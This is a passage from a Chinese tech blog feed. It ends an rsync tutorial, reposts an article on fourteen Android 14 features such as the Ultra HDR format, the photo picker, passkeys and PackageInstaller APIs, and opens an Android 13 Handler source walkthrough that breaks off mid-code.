class="headerlink" title="如何使用rsync？"></a>如何使用rsync？</h3><p>要将文件从本地主机复制到远程主机类似于scp，但有更多参数（如果您无法记住参数，别忘了 bash 别名是您最佳选择）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -partial -z -e <span class="string">&#x27;ssh -p 22&#x27;</span> test.cpp longzhiye@192.168.2.10:/home/longzhiye</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>名称</th></tr></thead><tbody><tr><td>test.cpp</td><td>源文件</td></tr><tr><td><a href="mailto:&#x6c;&#111;&#x6e;&#103;&#x7a;&#x68;&#x69;&#x79;&#x65;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x2e;&#49;&#48;">&#x6c;&#111;&#x6e;&#103;&#x7a;&#x68;&#x69;&#x79;&#x65;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x2e;&#49;&#48;</a>:/home/longzhiye</td><td>用于连接的用户、远程主机和路径。</td></tr><tr><td>-e ‘ssh -p’</td><td>告诉rsync使用端口22的ssh连接。</td></tr><tr><td>-z</td><td>进行压缩数据传输以加快速度。</td></tr><tr><td>-partial</td><td>这是一个“黄金”参数，允许我们恢复中断的传输。默认情况下，如果传输中断，rsync将删除任何部分传输的文件。在某些情况下，更希望保留部分传输的文件。使用–partial选项告诉rsync保留部分文件，这应该使随后传输剩余文件更快。</td></tr></tbody></table><h3 id="如何恢复中断的传输？"><a href="#如何恢复中断的传输？" class="headerlink" title="如何恢复中断的传输？"></a>如何恢复中断的传输？</h3><p>如果您在之前的段落中使用了 -partial 参数来启动传输，并且由于某种原因传输中断，您可以重新输入命令，哇！就像魔术一样！传输会从中断的点开始！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Rsync 非常强大，还有许多其他参数，比如带宽限制等，但最重要的参数是保持传输的恢复。请在评论中分享您使用scp和rsync的经验！您觉得我的文章对你有所帮助吗？</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> rsync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>喜欢 Android 14 的 14 个理由</title>
      <link href="/2023/11/11/2023-11-11/"/>
      <url>/2023/11/11/2023-11-11/</url>
      
        <content type="html"><![CDATA[<p>和去年 8 月中旬发布的 Android 13 正式版不同，今年的 Android 14 正式版延后到了 10 月 4 日——也就是 Pixel 8 系列发布的同一天。原因我们似乎也能从 Google 宣传新特性中略窥一二：</p><p>除了明确表示会率先向特定 Pixel 机型推送的 AI 壁纸生成，因为 OEM 厂商一般都会在系统界面、配色方案上搞「二创」，所以 Android 14 官方页面所宣传的锁屏时钟样式、黑白风格主题等特性，最后也极有可能只有 Pixel 用户才能体验到。</p><p><img src="/images/20231111/20231111001.jpg" alt="Android 14 的 14 个新特性 | 图：Google"></p><p>那 Android 14 能为非 Pixel 机型的用户带来什么？参考 Google 的官方<a href="https://www.youtube.com/watch?v=wEVaHobjbPw">介绍视频</a>，我们也从相关文档中整理了一份 Android 14 值得更新的 14 项新特性供你参考。</p><h3 id="1-更强大的照片格式"><a href="#1-更强大的照片格式" class="headerlink" title="1.更强大的照片格式"></a>1.更强大的照片格式</h3><blockquote><p>超强 HDR 图像格式！</p></blockquote><p>从 MIUI 相册的 HDR 显示到 OPPO 新近机型的 ProXDR，Android 在 HDR 照片显示这件事情上今年又上演了一次「厂商倒逼 Google」的戏码。在 Android 14 中，Google 终于为我们带来了对 10bit HDR 图像的原生支持，并且还一并推出了新的 Ultra HDR 图像格式。</p><p>根据 Google 的介绍，Ultra HDR 图像格式在保存时会保留来自传感器的更多信息，并在查看时展示更鲜艳的色彩、更高的动态范围和更强烈的对比度，简单来说就是小部分国产厂商近几年在卷的那种 HDR 照片显示效果。值得一提的是 Ultra HDR 格式可以完全向后兼容 JPEG 图像格式，它不仅能在 Google 相册等支持 HDR UI 的应用中被正确解码，在未适配 HDR 或不支持 HDR 显示的设备上，Ultra HDR 格式图像也能回落至标准动态范围（SDR）来正常显示。</p><p><img src="/images/20231111/20231111002.png" alt="演示效果，仅供参考 | 图：Google"></p><p>针对 Pixel 系列机型的 HDR 照片支持目前也是蓄势待发，刚发布不久的 Pixel 8 系列的相机应用已经内置了拍摄选项，开启该选项后所拍摄的 Ultra HDR 格式照片能够在 Google 相册中以 HDR 效果进行查看，同时 Lightroom 移动版也在最新的 9.0 版本针对 Pixel 7 系列和 Android 14 带来了 HDR 编辑与导出支持。</p><p><img src="/images/20231111/20231111003.png" alt="Pixel 新版相机应用中的 Ultra HDR 拍摄选项以及相册中的 Ultra HDR 标识"></p><p>总体而言 HDR 照片对大家来说依然是一个陌生的新生态，比如尽管我很想放上几张对比图给大家看看效果——咱们的编辑器和网页都不允许。</p><p>另外 Android 14 也为 Camera2 和 CameraX 等相机扩展组件带来了更新，允许第三方应用支持更长的照片处理时间、调用系统相机的算法密集型拍照功能（如暗光拍摄能力）等，这类面向开发者（并且不会有多少国内应用适配）的细节这里就不展开了。</p><h3 id="2-更规范的照片选取"><a href="#2-更规范的照片选取" class="headerlink" title="2.更规范的照片选取"></a>2.更规范的照片选取</h3><blockquote><p>好吧，至少从某种程度上来说是这样的。</p></blockquote><p>从某种程度上来说，Google 正在强制推行自 Android 13 引入的照片选择器。对用户而言这当然是需要重点关注的头等好事。</p><p>简单来说，和此前需要开发者适配、需要 Google Play 服务更新支持的做法不同，A<strong>ndroid 14 直接引入了一个让用户为 app 选择可见媒体文件的「中间层」，这个「中间层」用的正是照片选择器同样的设计</strong>：一个从底部弹出的照片和视频选择面板，内含支持多选和长按预览的「照片」（其实也可以选择视频）和可以按照路径位置查找媒体文件的「影集」两个页面。</p><p><img src="/images/20231111/20231111004.png" alt="通过照片选择器选择应用可访问的照片和视频"></p><p>在 Android 13 引入照片选择器这一设计后，Android 14 又新增了类似 iOS 那样的媒体文件范围选取机制，这套机制在 Android 14 中对应的权限是 <strong>READ_MEDIA_VISUAL_USER_SELECTED</strong>。</p><p><strong>这个权限和以往大部分新系统、新权限最大的不同点，在于它是由系统自动附加的</strong>。只要应用请求 <a href="https://developer.android.com/reference/android/Manifest.permission#READ_MEDIA_IMAGES">READ_MEDIA_IMAGES</a>、<a href="https://developer.android.com/reference/android/Manifest.permission#READ_MEDIA_VIDEO">READ_MEDIA_VIDEO</a> 或 <a href="https://developer.android.com/reference/android/Manifest.permission#ACCESS_MEDIA_LOCATION">ACCESS_MEDIA_LOCATION</a> 三类权限的任意一种，无论应用是否面向 Android 14 进行适配，<a href="https://developer.android.com/reference/android/Manifest.permission#READ_MEDIA_VISUAL_USER_SELECTED">READ_MEDIA_VISUAL_USER_SELECTED</a> 这一权限都会被自动添加到应用的声明清单中。</p><p>从我们的实际体验来看，市面上主流的、已经适配了 Android 13 媒体权限（即将<strong>音乐和音频、照片和视频</strong>两类权限分开授予）的应用，在 Android 14 中访问照片和视频权限时的确都会先调起 Google 的照片选择器——先让用户选择应用可以访问的内容，然后应用内置的媒体选择器才能将已授权的内容展示出来。并且这种授予也是临时的，一旦应用被放进后台或进程被用户结束，下次启动时相关的授予流程就还会再出现一次。</p><p><img src="/images/20231111/20231111005.png" alt="Android 14 的照片范围选择权限处理流程"></p><p>如此一来这套新权限的局限性（虽然是暂时的）也很明显了：依然有少部分应用获得了调用照片选择器的豁免权，最具代表性的比如目标 API 级别为 32、依然面向 Android 12 进行适配的「小而美」。</p><p>我知道你想说什么但先别急，我们在上面也提到「强制」和「暂时」，是因为根据 Google Play 商店的<a href="https://support.google.com/googleplay/android-developer/answer/11926878?hl=zh-Hans">目标 API 级别要求</a>，2023 年 8 月 31 日起所有提交至商店的应用更新都必须面向 Android 13 进行适配，虽然 Google 允许开发者申请延期至 11 月 1 日，但微信在 Play 商店的最后一次更新恰好是 8 月 24 日……张小龙会如何应对我们拭目以待。</p><p><img src="/images/20231111/20231111021.png" alt="Google Play 商店的目标 API 级别要求"></p><p>当然了，Google 也还是希望开发者都用标准化的照片管理器实现，毕竟视觉风格上与系统更搭。适配过的应用即便依然选择使用自己的媒体选择器实现方式，它们在 Android 14 中也能借助界面和操作提示引导用户重新选取更多媒体文件。</p><p><img src="/images/20231111/20231111006.png" alt="已适配 Android 14 部分的应用可引导用户选择更多媒体文件"></p><h3 id="3-更省电的缓存机制"><a href="#3-更省电的缓存机制" class="headerlink" title="3.更省电的缓存机制"></a>3.更省电的缓存机制</h3><blockquote><p>每次更新之后他们都这么说，这次是不是真的？</p></blockquote><p>尽管我一直坚持是因为天气转凉，升级到 Android 14 之后，的确有不少手持 Google Tensor 处理器设备的朋友向我表示手机更凉爽、续航也更长了。</p><p>那暂且将功劳归于 Android 14 开始生效的缓存应用冻结机制吧。</p><p>缓存，即将前台运行的应用放进内存，和直接杀掉进程不同，缓存的应用调用起来更快、重新开启所需要消耗的资源相比冷启动也更少。所以将暂时不用的应用放进缓存是一种非常合理的做法，Google 将「暂停执行已缓存的应用」放进 Android 系统的「开发者选项」后，这个功能也一直以「Android 的墓碑后台机制」的身份备受玩机群体的推崇。</p><p><img src="/images/20231111/20231111007.png" alt="暂停执行已缓存的应用设置"></p><p>根据 Google 公开的数据，被暂停执行的已缓存应用在 Android 14 测试版中消耗的 CPU 周期要比 Android 13 正式版少 50%，因此在 Android 14 中这一机制得到「转正」，以往缓存的应用可以基本不受限制地运行，但在 Android 14 上这些应用在进入缓存后很短的时间内就会被系统冻结，直接杜绝其 CPU 资源调用。</p><p>不知道是不是已经知道了此前「暂停执行已缓存应用」机制的问题，这次 Google 也特别提到冻结仅适用于常规的 Android 应用生命周期 API（如前台服务、JobScheduler 或 WorkManager）之外的后台工作。</p><p>另外值得一提的是，随着缓存机制的优化，Android 14 也打破了平台缓存应用数量的长期限制，减少了冷启动应用的情况，而且设备 RAM 越大改善就越明显：在 8GB 内存的设备上冷启动应用速度提高了 20%，在 12GB 内存的设备上则提高了 30%。</p><h3 id="4-更无感的登录体验"><a href="#4-更无感的登录体验" class="headerlink" title="4.更无感的登录体验"></a>4.更无感的登录体验</h3><p>和刚发布不久的 Windows 11 Moment 4 更新一样，Android 14 也是首个系统级支持通行密钥（Passkey）的版本。Android 14 在平台 API 中引入了凭据管理器（Credential Manager），并且通过 Jetpack 开发库和 Google Play 服务，让该功能可以一直向下支持到 Android 4.4（API 级别 19）的老设备。</p><p><img src="/images/20231111/20231111008.png" alt="使用通行密钥登录的流程演示 | 图：Google"></p><p>凭据管理器用于简化用户认证流程，并且主要通过通行密钥（Passkey）来提高安全性。</p><p>目前我们在 Android 14 的密码和帐号设置中可以看到通行密钥认证服务的相关设置，换句话说除了可以将手机上的生物识别信息作为通行密钥认证方式，Android 14 也支持添加第三方应用作为通行密钥管理应用。</p><p><img src="/images/20231111/20231111009.png" alt="Android 14 中的通行密钥管理服务设置"></p><p>不过虽然 1Password 早前宣布过对 Android 14 通行密钥管理的功能支持，但在最新的 Beta 测试版本中我们还无法成功调用 1Password 来创建通行密钥。</p><h3 id="5-更好看的返回动画"><a href="#5-更好看的返回动画" class="headerlink" title="5.更好看的返回动画"></a>5.更好看的返回动画</h3><blockquote><p>但「预见式返回动画」竟然还在「开发者选项」里。</p></blockquote><p>Google 提出的一个、有关 Android 系统返回的问题，即我们很多时候都不太确定返回操作会将自己带向何方。</p><p>为此 Android 13 提出了「预见式返回动画」这个解决方案，即通过一个类似「半确定」状态的动画预览，告知我们接下来会被带到哪里去——如果目的地非你所愿，那可能你就得取消返回操作、在当前界面中找找其他导航按键了（比如「向上」）。</p><p>两年过去了，这个特性准备得怎么样了？<strong>坏消息是它依然放在「开发者选项」里，好消息是它的确更完善了</strong>。</p><p><img src="/images/20231111/20231111010.gif" alt="预见式返回动画效果"></p><p>除了给返回箭头添加一个圆圆的、形状可变、颜色为 Material You 动态取色得背景之外，Android 14 正式版当中默认的预见式返回动画效果更自然、表现也更加稳定。同时 Google 也在 Android 14 中支持了自定义预见式返回手势动画的能力，允许开发者为应用中不同组件和不同界面的跳转加上更加赏心悦目的动画，官方 Material Design 组件库中也提供的底部菜单、侧栏菜单和搜索三种组件的返回动画供开发者参考、适配。</p><p><img src="/images/20231111/20231111011.gif" alt="底部菜单（Bottom Sheet）的预见式返回动画"></p><h3 id="6-更好的多语言支持"><a href="#6-更好的多语言支持" class="headerlink" title="6.更好的多语言支持"></a>6.更好的多语言支持</h3><blockquote><p>简体中文除外。</p></blockquote><p>和 MIUI 这类完全不管多语言支持的做法不同，Google 在原生 Android 的多语言支持上走的是另一个极端：完全不管除了简体中文以外的多语言支持——比起在 AOSP 提交中否决支持文字体可变字重支持的冷酷，今年 Android 14 引入的多语言支持可谓相当温暖：</p><p>比如针对特定语言中的语法性别现象的词形变化 API，用 Google 所举的例子来说，比如当我们的应用界面中需要显示「你已订阅……」这句提示语时，中文和英文状态下都是无需注意语法性别的，但如果是法语，这句话则可能对应三种情况：</p><ul><li>Vous êtes abonné à…</li><li>Vous êtes abonnée à…</li><li>Abonnement à…activé</li></ul><p>词形变化 API 就是用来简化并解决这类问题的。根据 Google 的描述，这个 API 能够帮助开发者根据使用者的性别展示对应的语法性别文本，降低这类需求带来的开发成本，避免应用在采用特定语言显示时因为忽略语法性别而冒犯用户。</p><p>再比如区域偏好设置。我们或多或少都在天气应用、测量工具、量化 app 中接触过与地区偏好相关的设定，从温度、距离、长度采用哪种单位、日期显示采用年月日还是日月年到每周的第一天究竟是周日还是周一……以往这类设置往往都散落在不同应用的设置当中，Android 14 则在「系统 &gt; 语言和输入法」中新增了一项面为「区域偏好设置」的独立页面，一方面方便用户提前选好自己想要的温度单位、每周起始日以及数字呈现方式，另一方面也配套为开发者提供了对应 API 和 Intent 来读取这些偏好设置，然后直接套用到应用当中。</p><p><img src="/images/20231111/20231111012.png" alt="Android 14 中的地区偏好设置"></p><p>根据 Google 给出的信息，这些偏好设置也能够在设备数据备份、还原的过程中在不同设备间迁移。</p><p>最后，针对 Android 13 引入的应用语言偏好设定，Android 14 也向输入法开放了应用语言的获取接口，让输入法能够根据不同应用的不同语言设定，自动弹出对应的输入键盘。</p><h3 id="7-更聪明的分享菜单"><a href="#7-更聪明的分享菜单" class="headerlink" title="7.更聪明的分享菜单"></a>7.更聪明的分享菜单</h3><blockquote><p>造轮子造出的新思路。</p></blockquote><p>当你在 Chrome 浏览器中点击「分享」按钮时，首先弹出的菜单是 Chrome 自行定制的分享菜单，这个分享菜单下方提供了包括屏幕截图、网页长截图、URL 链接复制等功能在内的六个分享操作——和 Android 系统的原生分享菜单（上图中点击「展开」后即是）不同，Chrome 在定制分享菜单中所提供的这些操作选项与我们的网页分享行为关联更加密切，或者说往往也是我们在浏览网页时主要考虑的一些操作。</p><p><img src="/images/20231111/20231111013.png" alt="Chrome 浏览器的定制分享菜单"></p><p>作为规则制定者的 Google 在自家 Chrome、Google 相册中都采用「自己造轮子」的方式设计一个独立的分享菜单，正好也能说明 Android 系统原生分享菜单存在一个大问题：太公平了。无论分享的内容是什么，Android 系统都会在长长的分享菜单中将提供分享操作的应用按照名称排序，找起来不方便、有的分享操作和实际分享内容的关联性也比较差。</p><p>因此在 Android 14 中，Google 基于 Chrome 和 Google 相册的分享菜单设计思路，向应用开放了分享菜单自定义操作定制功能，允许开发者针对特定文件类型声明分享自定义操作，当用户呼出分享菜单时，这些操作选项会出现在分享列表顶部和分享内容预览之间，方便用户快速调用可能需要的应用执行下一步动作；同时 Google 也希望通过调整 Direct Share 目标排序的方式来优化 Android 分享菜单的可用性。</p><p><img src="/images/20231111/20231111014.png" alt="自定义分享操作按钮示意图"></p><p>除了上述改动，Google 在 Android 14 中还将分享菜单做成了可独立更新的 Project Mainline 模块方便功能迭代，并且允许用户通过分享预览即时调整、编辑分享内容。</p><h3 id="8-更友好的缩放体验"><a href="#8-更友好的缩放体验" class="headerlink" title="8.更友好的缩放体验"></a>8.更友好的缩放体验</h3><blockquote><p>可惜来得有点晚，国内适老化的字体改造已经乱七八糟了。</p></blockquote><p>在 Android 14 中，Google 还带来了最高 200% 的非线性字体缩放功能。和此前版本的机械缩放不同，采用非线性放大曲线的好处在于，界面中原本已经足够大的文本不会随着全局设定而同步缩放，文本之间的大小关系、层级结构都能得到有效保留，较大的字体更不会因为缩放而出现文本截断、难以阅读等问题。</p><p><img src="/images/20231111/20231111015.png" alt="正常大小、线性 200% 缩放与非线性 200% 缩放，非线性缩放能在保证所有文本具备可读性的同时避免原本就已经很大的字体被机械放大"></p><p>在后续的版本中，Google 还在系统的快速设置面板中添加了一个专门用于字体缩放的开关，有这方面需求的朋友可以借助这个开关随时调整阅读体验。</p><p><img src="/images/20231111/20231111016.png" alt="正式版新增的字体大小快速设置开关"></p><h3 id="9-更透明的权限调用"><a href="#9-更透明的权限调用" class="headerlink" title="9.更透明的权限调用"></a>9.更透明的权限调用</h3><blockquote><p>收紧关键权限、方便用户管理是永恒的主题。</p></blockquote><p>很多人不知道的是，很多依赖定时执行任务或发出提醒的应用（比如 Tasker 也用）都会用到的闹钟——你看不见也听不到的那种。根据应用内设置的不同，这些闹钟会在既定的时间拉起应用，帮助应用准时完善用户设置好的任务。</p><p>不过问题在于，通过精确闹钟唤醒应用是一种资源消耗极强、Google 也非常不推荐的定时任务规划手段（根据 Google 的开发者文档它可以随时将设备从 Doze 状态中唤醒），此前引入的 <strong>闹钟和提醒</strong> 权限不再默认授予。这项限制适用于新安装的、面向 Android 13 及以上系统适配的应用。</p><p><img src="/images/20231111/20231111017.png" alt="闹钟和提醒权限授予提示与授予界面"></p><p>与之类似的，Android 14 开始 Google 也会通过 Play 商店策略对非通话、闹钟类型的应用移除针对 <a href="https://developer.android.com/reference/android/Manifest.permission#USE_FULL_SCREEN_INTENT">USE_FULL_SCREEN_INTENT</a> 这一权限的默认授权——在此前的版本中，应用可以借助这一权限在锁屏状态下弹出全屏通知，而 2023 年年底这一政策生效之后，开发者就需要通过适配专门的<a href="https://developer.android.com/reference/android/provider/Settings#ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT">新 API</a> 来向用户发起授权申请了。</p><p>Google 也在提高用户敏感数据使用情况在 Android 14 中的可见性。除了将部分数据安全相关的信息直接放进对应的权限授予弹窗外，Android 14 还会在特定情况下向用户发出通知提醒，包括：</p><ul><li>应用开始向第三方共享位置信息</li><li>应用开始将位置信息用于广告目的</li></ul><p><img src="/images/20231111/20231111018.png" alt="位置信息授权时提供的数据安全提示与 Play 商店中的数据安全提示"></p><p>尽管目前大部分与敏感信息使用透明化相关的改动都围绕位置信息，此前 Google 在 I/O 大会上也透露过后续会将范围向其他个人信息扩展的计划。</p><h3 id="10-更尴尬的截图提示"><a href="#10-更尴尬的截图提示" class="headerlink" title="10.更尴尬的截图提示"></a>10.更尴尬的截图提示</h3><blockquote><p>你截屏了！系统知道、对方可能也会知道。</p></blockquote><p>当你在即时消息里向朋友诉苦、当老板在公司群里激情发言，应用里突然弹出通知提示说「对方刚刚进行了截屏操作」……类似的功能在 Android 14 中接下来就有 API 支持了。</p><p>借助 <a href="https://developer.android.google.cn/reference/android/Manifest.permission#DETECT_SCREEN_CAPTURE">DETECT_SCREEN_CAPTURE</a> 这一 API，应用在 Android 14 中可以获知与按键操作相关的截图事件（一般是电源键+音量减）了——然后应用开发者可以向用户发出提示，比如付款应用提醒用户不要随便截图分享收款码，或者将这个事件传递给其他人（官方文档中似乎并没有限制开发者这么操作），告诉对方你刚刚进行了截图。</p><p><img src="/images/20231111/20231111019.png" alt="Google 给出的截图操作提示使用场景"></p><p>然后呢？然后就看谁比较尴尬吧。不过大家也不用担心，一方面这个 API 只会检测基于按键操作的截图事件，ADB、录屏应用等应该不受影响——另一方面这种 Android 新版本特性，至少你每天都要用的微信是不会跟进的。</p><h3 id="11-更灵活的常驻通知"><a href="#11-更灵活的常驻通知" class="headerlink" title="11.更灵活的常驻通知"></a>11.更灵活的常驻通知</h3><blockquote><p>那么「常驻」的意义是……？</p></blockquote><p>一个相比其他改动而言不怎么起眼，但真正用的时候能让人楞上几秒的小改动：在 Android 14 中，常驻通知可以被用户手动划走消除了。</p><p><img src="/images/20231111/20231111020.gif" alt="新的常驻通知清除机制"></p><p>Google 也为常驻通知消除机制设定了一套比较基础的规则：</p><ul><li>当我们点击通知面板中的「清除全部」按钮时，常驻通知不受影响</li><li>当手机屏幕锁定时，常驻通知不可被消除</li><li><a href="https://developer.android.com/reference/androidx/core/app/NotificationCompat.CallStyle">CallStyle</a> 类别（通常与通话相关）的常驻通知不可被消除</li><li>使用通知面板中的「清除全部」选项时，常驻通知不会被消除</li></ul><h3 id="12-更现代的无损音频"><a href="#12-更现代的无损音频" class="headerlink" title="12.更现代的无损音频"></a>12.更现代的无损音频</h3><blockquote><p>给 USB-C 有线耳机用户一点爱。</p></blockquote><p>干掉 3.5mm 接口之后，近几年真无线蓝牙耳机井喷式发展，各种传输协议也是日新月异。好在 Android 14 这次也关照到了那些坚持使用 USB-C 接口有线听歌的音乐发烧友。</p><p>Android 14 向开发者开放了 USB 设备首选混音器属性的能力，允许开发者注册侦听器以获取首选混音器属性的更改，并使用新的 <a href="https://developer.android.google.cn/reference/android/media/AudioMixerAttributes">AudioMixerAttributes</a> 类配置混音器属性。AudioMixerAttributes 类支持在无混音、音量调整或后处理效果的前提下直接传输音频，进而带来无损的有线听歌体验。</p><h3 id="13-更通用的健康数据"><a href="#13-更通用的健康数据" class="headerlink" title="13.更通用的健康数据"></a>13.更通用的健康数据</h3><blockquote><p>继健康数据与平台解绑之后，Health Connect 自身进一步与 Google Play 商店解绑。好事。</p></blockquote><p>2022 年 5 月，今年 5 月，Google 在 Android 开发者官方博客中隆重推出了一个名为 Health Connect 的新平台并推出了相应的 API。Health Connect 官方网站用非常显眼的大标题和副标题简洁地描述了其核心功能与优势：简化健康类应用之间的连接。</p><p>散落在不同应用、服务和可穿戴设备中的健康数据，在 Android 平台上有了一个通用的、可实现数据迁移的中间平台。而从 Android 14 开始，Health Connect 开始从此前需要从 Play 商店下载安装的独立应用升级为系统能力，它将以系统组件的身份通过 Google Play 系统更新接收更新，对不能直接访问 Play 商店但可以借助 OEM 厂商定期更新系统的国内用户而言也是好事一件。</p><p>另外，Health Connect 也跟随本次更新新增了包括运动路线在内的更多数据类型。</p><h3 id="14-更开放的商店策略"><a href="#14-更开放的商店策略" class="headerlink" title="14.更开放的商店策略"></a>14.更开放的商店策略</h3><blockquote><p>感谢欧盟。</p></blockquote><p>8 月 25 日，欧盟《数字服务法案》正式生效。作为受该法案重点关照的大公司之一，Google 也在第三方应用商店这个反垄断诉讼的「热门话题」上做了不少工作。</p><p>在 Android 14 中，Google 引入了多个 <a href="https://developer.android.com/reference/android/content/pm/PackageInstaller">PackageInstaller</a> API 来保证第三方应用商店的使用体验：</p><ul><li><a href="https://developer.android.com/reference/android/content/pm/PackageInstaller.Session#requestUserPreapproval(android.content.pm.PackageInstaller.PreapprovalDetails,%20android.content.IntentSender)">requestUserPreapproval()</a> 允许第三方应用商店提前请求用户的安装批准，并且在用户授权后可以实现后台下载和安装体验</li><li><a href="https://developer.android.com/reference/android/content/pm/PackageInstaller.SessionParams#setRequestUpdateOwnership(boolean)">setRequestUpdateOwnership()</a> 允许第三方应用商店通过所有权声明指定应用自动更新的安装来源，非指定来源的应用升级需要用户手动批准</li><li><a href="https://developer.android.com/reference/android/content/pm/PackageInstaller.InstallConstraints">InstallConstraints</a> API 允许第三方应用商店选择用户并未与 app 交互的时段更新应用</li><li><a href="https://developer.android.com/reference/android/content/pm/PackageInstaller.SessionParams#setDontKillApp(boolean)">setDontKillApp()</a> 允许第三方应用商店针对支持拆分式安装包（APKs）的应用采用无缝更新，比如仅更新用户当前未在使用的组件<br>最后，从 Android 14 开始系统软件包安装程序也允许开发者指定要包含在应用中的 Google Play 应用商店页面的应用元数据，例如数据安全信息等。这同时也能方便第三方应用商店获取与应用相关的元数据信息</li></ul><p>以上文章转载自少数派文章(<a href="https://sspai.com/post/83501">https://sspai.com/post/83501</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13 Handler详解</title>
      <link href="/2023/11/05/2023-11-05/"/>
      <url>/2023/11/05/2023-11-05/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Handler-简介"><a href="#1-Handler-简介" class="headerlink" title="1.Handler 简介"></a>1.Handler 简介</h3><p>Handler 是一套 Android 消息传递机制。在多线程应用场景中，将子线程中需要更新 UI 的操作消息，传递到 UI 主线程，从而实现子线程通知 UI 更新最终实现异步消息处理。说白了是用于线程之间的通信。<br>Handler主要有4个重要类：Handler、Message、MessageQueue、Looper。</p><ul><li>Handler：负责消息的发送和处理，子线程中使用 sendMessage() 发送消息；在handleMessage()中处理。</li><li>Message：消息载体，里面存储这线程消息。</li><li>MessageQueue：消息队列，遵循先进先出的原则，存储着 sendMessage() 发送来的子线程消息。</li><li>Looper：消息循环器，负责从 MessageQueue 中循环取消息，再将取出的消息分发给handleMessage()，来处理消息。</li></ul><h3 id="2-Handler原理"><a href="#2-Handler原理" class="headerlink" title="2.Handler原理"></a>2.Handler原理</h3><p><img src="/images/20231105/20231105001.png"></p><h3 id="3-Handler-源码"><a href="#3-Handler-源码" class="headerlink" title="3.Handler 源码"></a>3.Handler 源码</h3><p>了解 Handler，首先我们要了解 Handler 从消息发送到消息处理这整个流程，下面将分析这一流程，并回答下面几个问题：</p><ol><li>一个线程有几个Handler?</li><li>一个线程有几个Looper？如何保证？</li><li>Handler 内存泄漏原因？为什么其他的内部分没有过这个问题？</li><li>为何主线程可以 new Handler？如果想要在子线程中 new Handler 要做些什么准备？</li><li>子线程中的维护的 looper，消息队列无消息的时候处理方案是什么？有什么用？</li><li>既然可以存在多个 Handler 往 MessageQueue 中添加数据（发消息时，各个handler 可能处于不同的线程），那么它内部是如何确保线程安全的？</li><li>我们使用 Message 时应如何创建它？</li><li>使用 Handler 的 postDelay 后，消息队列会有什么变化？</li><li>Looper 死循环为什么不会导致应用卡死(ANR)?</li></ol><h4 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h4><p>Handler 负责消息的发送和处理，该类中通过 sendXXX、postXXX等方法发送消息，共有14个这样的方法。而在 handleMessage() 中处理收到的消息。<br>这里以 sendMessage(Message msg) 方法为例进行源码分析。<br><strong>frameworks/base/core/java/android/os/Handler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">sendMessage</span><span class="params">(<span class="meta">@NonNull</span> Message msg)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sendMessageDelayed(msg, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">sendMessageDelayed</span><span class="params">(<span class="meta">@NonNull</span> Message msg, <span class="type">long</span> delayMillis)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (delayMillis &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            delayMillis = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第二的参数代表执行的时间，为：系统当前时间+延迟的时间</span></span><br><span class="line">        <span class="keyword">return</span> sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">sendMessageAtTime</span><span class="params">(<span class="meta">@NonNull</span> Message msg, <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="type">MessageQueue</span> <span class="variable">queue</span> <span class="operator">=</span> mQueue;</span><br><span class="line">        <span class="keyword">if</span> (queue == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">RuntimeException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(</span><br><span class="line">                    <span class="built_in">this</span> + <span class="string">&quot; sendMessageAtTime() called with no mQueue&quot;</span>);</span><br><span class="line">            Log.w(<span class="string">&quot;Looper&quot;</span>, e.getMessage(), e);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> enqueueMessage(queue, msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不管使用什么方法发送消息，都会调到 